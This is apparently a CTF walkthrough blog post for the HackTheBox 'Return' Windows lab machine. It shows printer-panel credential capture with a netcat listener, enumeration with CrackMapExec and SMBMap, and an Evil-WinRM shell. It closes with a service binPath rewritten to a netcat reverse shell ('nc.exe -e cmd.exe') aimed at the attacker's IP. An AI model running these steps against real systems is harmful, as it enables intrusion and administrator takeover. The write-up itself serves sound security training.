---
title: "Walk-through of Return from HackTHeBox"
header:
  teaser: /assets/images/2021-10-17-12-48-57.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Windows
  - CrackMapExec
  - SMBMap
  - Evil-WinRM
---

## Machine Information

![return](/assets/images/2021-10-17-12-48-57.png)

Return is an easy machine on HackTheBox. We start with a website hosting a printer admin panel which we can redirect to point at our attacking machine allowing the capture of a service account credentials. Using these we enumerate with CrackMapExec and SMBMap, then gain a shell with Evil-WinRM. From there we enumerate further to discover our service account is also a member of the Server Operators group. We use these rights to change a service to point a reverse shell back to us and gain administrator access to complete the box.

<!--more-->

Skills required are basic web and OS enumeration. Skills learned are using CrackMapExec, SMBMap, and other tools to enumerate and exploit misconfigurations.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Easy - Return](https://www.hackthebox.eu/home/machines/profile/401) |
| Machine Release Date | 27th September 2021 |
| Date I Completed It | 18th October 2021 |
| Distribution Used | Kali 2021.3 – [Release Info](https://www.kali.org/blog/kali-linux-2021-3-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/return]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.108 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb/return]
└─# nmap -p$ports -sC -sV -oA return 10.10.11.108
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-16 12:21 BST
Nmap scan report for 10.10.11.108
Host is up (0.029s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-10-16 11:55:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 33m23s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-10-16T11:56:24
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.26 seconds
```

It's a Windows box so lots of open ports. We see from the scan it's name is return.local, we can use CrackMapExec to confirm the hostname as well:

```sh
┌──(root💀kali)-[~/htb/return]
└─# crackmapexec smb return.local
SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
```

We can also gather a lot of information using Python and [this](https://book.hacktricks.xyz/pentesting/pentesting-ldap) HackTricks guide:

```python
┌──(root💀kali)-[~/htb/return]
└─# python3
Python 3.9.7 (default, Sep 24 2021, 09:43:00)
[GCC 10.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import ldap3
>>> server = ldap3.Server('10.10.11.108', get_info = ldap3.ALL, port =389)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
True
>>> server.info
DSA info (from DSE):
  Supported LDAP versions: 3, 2
  Naming contexts: 
    DC=return,DC=local
    CN=Configuration,DC=return,DC=local
    CN=Schema,CN=Configuration,DC=return,DC=local
    DC=DomainDnsZones,DC=return,DC=local
    DC=ForestDnsZones,DC=return,DC=local
  Supported controls: 
    1.2.840.113556.1.4.1338 - Verify name - Control - MICROSOFT
    1.2.840.113556.1.4.1339 - Domain scope - Control - MICROSOFT
    1.2.840.113556.1.4.1340 - Search options - Control - MICROSOFT
    1.2.840.113556.1.4.1341 - RODC DCPROMO - Control - MICROSOFT
    <SNIP>
    1.2.840.113556.1.4.319 - LDAP Simple Paged Results - Control - RFC2696
    1.2.840.113556.1.4.417 - LDAP server show deleted objects - Control - MICROSOFT
  Supported extensions: 
    1.3.6.1.4.1.1466.20037 - StartTLS - Extension - RFC4511-RFC4513
    1.3.6.1.4.1.4203.1.11.3 - Who am I - Extension - RFC4532
  Supported features: 
    1.2.840.113556.1.4.1791 - Active directory LDAP Integration - Feature - MICROSOFT
    1.2.840.113556.1.4.800 - Active directory - Feature - MICROSOFT
  Supported SASL mechanisms: 
    GSSAPI, GSS-SPNEGO, EXTERNAL, DIGEST-MD5
  Schema entry: 
    CN=Aggregate,CN=Schema,CN=Configuration,DC=return,DC=local
Other:
<SNIP>
```

Let's put the box in our hosts file:

```sh
┌──(root💀kali)-[~/htb/return]
└─# echo "10.10.11.108 return.local" >> /etc/hosts  
```

## Printer Admin

A look at port 80 we see we have a printer admin panel:

![return](/assets/images/2021-10-17-22-37-27.png)

The settings page provides useful information:

![return-settings](/assets/images/2021-10-17-22-39-19.png)

The password is hashed out but we have the ability to change the server address. [This](https://www.ceos3c.com/security/obtaining-domain-credentials-printer-netcat) article shows how we can capture the password by pointing the server address to a netcat listener on Kali.

 We just change the server address from printer.return.local to our Kali tun0 IP, when we click update we see the creds have been captured by netcat:

```sh
┌──(root💀kali)-[~/htb/return]
└─# nc -nlvp 389listening on [any] 389 ...
connect to [10.10.15.39] from (UNKNOWN) [10.10.11.108] 60718
0*`%return\svc-printer
                       1edFg43012!!
```

## CrackMapExec

Now we have credentials we can go back to CrackMapExec and gather more information:

```sh
──(root💀kali)-[~/htb/return]
└─# crackmapexec smb printer.return.local -u "svc-printer" -p "1edFg43012\!\!" --rid-brute
SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108    445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 
SMB         10.10.11.108    445    PRINTER          [+] Brute forcing RIDs
SMB         10.10.11.108    445    PRINTER          498: RETURN\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.108    445    PRINTER          500: RETURN\Administrator (SidTypeUser)
SMB         10.10.11.108    445    PRINTER          501: RETURN\Guest (SidTypeUser)
SMB         10.10.11.108    445    PRINTER          502: RETURN\krbtgt (SidTypeUser)
SMB         10.10.11.108    445    PRINTER          512: RETURN\Domain Admins (SidTypeGroup)
SMB         10.10.11.108    445    PRINTER          513: RETURN\Domain Users (SidTypeGroup)
SMB         10.10.11.108    445    PRINTER          514: RETURN\Domain Guests (SidTypeGroup)
SMB         10.10.11.108    445    PRINTER          515: RETURN\Domain Computers (SidTypeGroup)
SMB         10.10.11.108    445    PRINTER          516: RETURN\Domain Controllers (SidTypeGroup)
SMB         10.10.11.108    445    PRINTER          517: RETURN\Cert Publishers (SidTypeAlias)
SMB         10.10.11.108    445    PRINTER          518: RETURN\Schema Admins (SidTypeGroup)
SMB         10.10.11.108    445    PRINTER          519: RETURN\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.108    445    PRINTER          520: RETURN\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.108    445    PRINTER          521: RETURN\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.108    445    PRINTER          522: RETURN\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.108    445    PRINTER          525: RETURN\Protected Users (SidTypeGroup)
SMB         10.10.11.108    445    PRINTER          526: RETURN\Key Admins (SidTypeGroup)
SMB         10.10.11.108    445    PRINTER          527: RETURN\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.108    445    PRINTER          553: RETURN\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.108    445    PRINTER          571: RETURN\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.108    445    PRINTER          572: RETURN\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.108    445    PRINTER          1000: RETURN\PRINTER$ (SidTypeUser)
SMB         10.10.11.108    445    PRINTER          1101: RETURN\DnsAdmins (SidTypeAlias)
SMB         10.10.11.108    445    PRINTER          1102: RETURN\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.108    445    PRINTER          1103: RETURN\svc-printer (SidTypeUser)
```

## SMBMap

We can also look at SMB now we have credentials:

```sh
┌──(root💀kali)-[~/htb/return]
└─# smbmap -H return.local -u svc-printer -p "1edFg43012\!\!"
[+] IP: return.local:445        Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  READ ONLY       Remote Admin
        C$                                                      READ, WRITE     Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
```

We have read/write access to C$, let's look around:

```sh
┌──(root💀kali)-[~/htb/return]
└─# smbmap -H return.local -u svc-printer -p "1edFg43012\!\!" -r C$
[+] IP: return.local:445        Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        C$                                                      READ, WRITE
        <SNIP>
        dw--w--w--                0 Mon Sep 27 12:46:28 2021    Program Files
        dr--r--r--                0 Wed May 26 10:57:54 2021    Program Files (x86)
        dr--r--r--                0 Mon Sep 27 12:46:01 2021    ProgramData
        dr--r--r--                0 Fri Jul 16 14:43:37 2021    Recovery
        dr--r--r--                0 Thu May 20 13:42:27 2021    System Volume Information
        dw--w--w--                0 Wed May 26 09:51:28 2021    Users
        dr--r--r--                0 Mon Sep 27 12:49:06 2021    Windows

┌──(root💀kali)-[~/htb/return]
└─# smbmap -H return.local -u svc-printer -p '1edFg43012!!' -r C$/Users                                                               
[+] IP: return.local:445        Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        C$                                                      READ, WRITE
        .\C$Users\*
        dr--r--r--                0 Mon Sep 27 12:40:38 2021    Administrator
        dr--r--r--                0 Thu May 20 21:07:06 2021    All Users
        dw--w--w--                0 Thu May 20 20:08:51 2021    Default
        dr--r--r--                0 Thu May 20 21:07:06 2021    Default User
        fr--r--r--              174 Thu May 20 21:02:48 2021    desktop.ini
        dw--w--w--                0 Wed May 26 09:50:07 2021    Public
        dr--r--r--                0 Wed May 26 09:51:28 2021    svc-printer

┌──(root💀kali)-[~/htb/return]
└─# smbmap -H return.local -u svc-printer -p '1edFg43012!!' -r C$/Users/svc-printer
[+] IP: return.local:445        Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        C$                                                      READ, WRITE
        .\C$Users\svc-printer\*
        dr--r--r--                0 Wed May 26 09:51:28 2021    AppData
        dr--r--r--                0 Wed May 26 09:51:28 2021    Application Data
        dr--r--r--                0 Wed May 26 09:51:28 2021    Cookies
        dw--w--w--                0 Mon Sep 27 13:59:35 2021    Desktop
        dw--w--w--                0 Sat Oct 16 16:54:52 2021    Documents
        dw--w--w--                0 Wed May 26 09:51:28 2021    Downloads
        <SNIP>
        dw--w--w--                0 Wed May 26 09:51:28 2021    Videos

┌──(root💀kali)-[~/htb/return]
└─# smbmap -H return.local -u svc-printer -p '1edFg43012!!' -r C$/Users/svc-printer/Desktop
[+] IP: return.local:445        Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        C$                                                      READ, WRITE
        .\C$Users\svc-printer\Desktop\*
        fw--w--w--               34 Fri Oct 15 06:22:27 2021    user.txt
```

We found the user flag which we can get now if we wanted:

```sh
┌──(root💀kali)-[~/htb/return]
└─# smbmap -H return.local -u svc-printer -p '1edFg43012!!' -r C$/Users/svc-printer/Desktop -A 'user.txt'
[+] IP: return.local:445        Name: unknown
[+] Starting search for files matching 'user.txt' on share C$.
[+] Match found! Downloading: C$Users\svc-printer\Desktop\user.txt
```

## Evil-WinRM

With credentials for a user account we can get a interactive shell using [Evil-WinRM](https://github.com/Hackplayers/evil-winrm):

```sh
┌──(root💀kali)-[~/htb/return]
└─# gem install evil-winrm
Fetching httpclient-2.8.3.gem
Fetching builder-3.2.4.gem
Fetching multi_json-1.15.0.gem
<SNIP>
Happy hacking! :)
Successfully installed evil-winrm-3.3
Parsing documentation for rubyntlm-0.6.3
Installing ri documentation for rubyntlm-0.6.3
<SNIP>
Done installing documentation for rubyntlm, nori, multi_json, little-plugger, logging, httpclient, builder, gyoku, gssapi, erubi, winrm, winrm-fs, logger, evil-winrm after 6 seconds
14 gems installed
```

```sh
┌──(root💀kali)-[~/htb/return/evil-winrm]
└─# evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'
Evil-WinRM shell v3.3
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents> menu

   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (     '    ("     )  )'     ,'   .  ,)  
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers
[+] Dll-Loader 
[+] Donut-Loader 
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit
```

## User Investigation

Now we can investigate users, groups and permissions:

```text
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami
return\svc-printer

*Evil-WinRM* PS C:\Users\svc-printer\desktop> whoami /groups
GROUP INFORMATION
-----------------
Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288

*Evil-WinRM* PS C:\Users\svc-printer\Documents> net users
User accounts for \\
-------------------------------------------------------------------------------
Administrator            Guest                    krbtgt
svc-printer
The command completed with one or more errors.

*Evil-WinRM* PS C:\Users\svc-printer\Documents> net groups
Group Accounts for \\
-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Key Admins
*Protected Users
*Read-only Domain Controllers
*Schema Admins
The command completed with one or more errors.

*Evil-WinRM* PS C:\Users\svc-printer\Documents> net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 1:15:13 AM
Password expires             Never
Password changeable          5/27/2021 1:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/16/2021 10:01:36 AM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.
```

Above we have gathered lots of useful information, the most interesting thing we see is our user is in the Server Operators groups. Detailed [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) we see this gives us:

```text
Members of the Server Operators group can sign in to a server interactively,
create and delete network shared resources, start and stop services,
back up and restore files, format the hard disk drive of the computer,
and shut down the computer.
```

## Service Configuration

The focus for our next move is to interact with services. We can see from within Evil-WinRM what we have access to:

```text
*Evil-WinRM* PS C:\Users\svc-printer\desktop> services

Path                                                                              Privileges Service          
----                                                                              ---------- -------          
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                         True       ADWS             
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                     True       NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                  True       PerfHost         
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"        False      Sense            
C:\Windows\servicing\TrustedInstaller.exe                                         False      TrustedInstaller 
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"            True       VGAuthService    
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                               True       VMTools          
"C:\WINDOWS\system32\vssvc.exe"                                                   True       VSS              
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"    True       WdNisSvc         
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"   True       WinDefend        
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                              False      WMPNetworkSvc
```

First we need to upload the Windows version of netcat:

```text
*Evil-WinRM* PS C:\Users\svc-printer\desktop> upload /root/htb/return/nc.exe
Info: Uploading /root/htb/return/pencer.dll to C:\Users\svc-printer\desktop\nc.exe.dll
Data: 11604 bytes of 11604 bytes copied
Info: Upload successful!
```

After uploading it I tried to create my own service:

```text
*Evil-WinRM* PS C:\Users\svc-printer\desktop> sc.exe create pencer binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10.10.15.39 4444"
[SC] OpenSCManager FAILED 5:
Access is denied.
```

Then I tried changing the config of an existing server so it uses my netcat instead for it's binary:

```text
*Evil-WinRM* PS C:\Users\svc-printer\desktop> sc.exe config WMPNetworkSvc binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10.10.15.39 4444"
[SC] OpenService FAILED 5:
Access is denied.

*Evil-WinRM* PS C:\Users\svc-printer\desktop> sc.exe config PerfHost binpath="C:\Users\svc-printer\desktop\nc.exe -e cmd.exe 10.10.15.39 4444"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\desktop> sc.exe start PerfHost
[SC] StartService FAILED 5:
Access is denied.
```

Finally I got to the VSS service:

```text
*Evil-WinRM* PS C:\Users\svc-printer\desktop> sc.exe query VSS
SERVICE_NAME: VSS
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0

*Evil-WinRM* PS C:\Users\svc-printer\desktop> sc.exe config VSS binpath="C:\Users\svc-printer\desktop\nc.exe -e cmd.exe 10.10.15.39 4444"
[SC] ChangeServiceConfig SUCCESS
```

Now checking services again we see it's path now uses my payload:

```text
*Evil-WinRM* PS C:\Users\svc-printer\desktop> services
Path                                                              Privileges Service          
----                                                              ---------- -------          
<SNIP>
C:\Users\svc-printer\desktop\nc.exe -e cmd.exe 10.10.15.39 4444   True       VSS              
<SNIP>
```

With that in place we can start a netcat listener waiting on Kali to catch the reverse shell. Then we start the service on the box:

```text
*Evil-WinRM* PS C:\Users\svc-printer\desktop> sc.exe start VSS
```

## Administrator Shell

Switching to Kali we have our shell connected as local administrator on the box:

```text
┌──(root💀kali)-[~/htb/return]
└─# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.15.39] from (UNKNOWN) [10.10.11.108] 63661
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Windows\system32>
```

Now we can get our root flag:

```text
C:\Windows\system32>cd c:\users
c:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is 3A0C-428E
 Directory of c:\Users
09/27/2021  04:40 AM    <DIR>          Administrator
05/26/2021  01:50 AM    <DIR>          Public
05/26/2021  01:51 AM    <DIR>          svc-printer
               0 File(s)              0 bytes
               5 Dir(s)   8,419,307,520 bytes free

c:\Users>cd administrator
c:\Users\Administrator>cd desktop
c:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 3A0C-428E
 Directory of c:\Users\Administrator\Desktop
10/14/2021  10:22 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   8,419,307,520 bytes free

c:\Users\Administrator\Desktop>type root.txt
<HIDDEN>
```

We have to be quick because eventually the service will timeout trying to start and our shell get's disconnected:

```text
*Evil-WinRM* PS C:\Users\svc-printer\desktop> sc.exe start VSS
[SC] StartService FAILED 1053:
The service did not respond to the start or control request in a timely fashion.
```

I hope you enjoyed this simple box. See you next time.
